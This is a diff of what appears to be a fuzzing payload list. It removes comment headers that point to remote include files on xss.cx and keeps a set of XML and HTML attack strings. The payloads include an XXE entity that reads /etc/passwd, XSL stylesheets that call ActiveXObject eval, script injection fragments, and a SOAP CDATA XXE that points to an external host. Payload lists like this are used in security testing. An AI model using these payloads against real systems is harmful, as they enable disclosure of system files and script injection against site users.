@@ -1,9 +1,3 @@
-/* Remote File Include with XML TAGS via XSS.Cx  */
-/* INCLUDE:URL http://xss.cx/examples/ultra-low-hanging-fruit/no-experience-required-javascript-injection-signatures-only-fools-dont-use.txt */
-/* INCLUDE:URL http://xss.cx/examples/ultra-low-hanging-fruit/no-experience-required-xss-signatures-only-fools-dont-use.txt */
-/* INCLUDE:URL http://xss.cx/examples/ultra-low-hanging-fruit/no-experience-required-css-injection-signatures-only-fools-dont-use.txt */
-/* INCLUDE:URL http://xss.cx/examples/ultra-low-hanging-fruit/no-experience-required-xss-signatures-only-fools-dont-use.txt */
-/* RFI START */
 <!DOCTYPE	html[	<!ENTITY	%	foo	SYSTEM	"file:///etc/passwd">	%foo;]>	
 <!DOCTYPE html PUBLIC "" ""><style xmlns="http://www.w3.org/1999/xhtml ">*{animation-name:a}@-ms-keyframes a{0%{font:menu
 <!DOCTYPE html><script>(d=document).createElement("table").appendChild(d.createElement("head"))</script>
@@ -30,4 +24,3 @@
 <?xml-stylesheet type="text/xsl" href="#" ?><stylesheet xmlns="http://www.w3.org/TR/WD-xsl"><template match="/"><eval>new ActiveXObject(&apos;htmlfile&apos;).parentWindow.alert(1)</eval><if expr="new ActiveXObject('htmlfile').parentWindow.alert(2)"></if></template></stylesheet>
 <?xml-stylesheet type="text/xsl" href="#"?><img xmlns="x-schema:test.xdr"/>
 <soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://0x0:22/"> %dtd;]><xxx/>]]></foo></soap:Body>
-/* RFI END */
